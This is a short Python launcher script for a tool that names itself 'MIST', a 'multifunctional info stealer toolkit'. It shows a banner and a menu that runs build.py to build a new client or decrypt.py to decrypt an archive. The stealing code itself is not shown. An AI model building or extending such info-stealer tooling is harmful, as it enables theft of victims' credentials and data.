import pyfiglet
import os
import sys


def head():
    os.system('cls||clear')
    print('\033[92m', end="")
    banner = pyfiglet.figlet_format("MIST", font="banner", justify="center")
    print(banner)
    print("multifunctional info stealer toolkit".center(os.get_terminal_size().columns))
    print('\033[0m', end="")


head()
print('  [ 1 ] - Build new client')
print('  [ 2 ] - Decrypt archive')
try:
    option = int(input('Choose an option >> '))
except:
    print('Option incorrect!')
    sys.exit()

if option == 1:
    os.system('python build.py')
elif option == 2:
    os.system('python decrypt.py')
else:
    print('Option incorrect!')
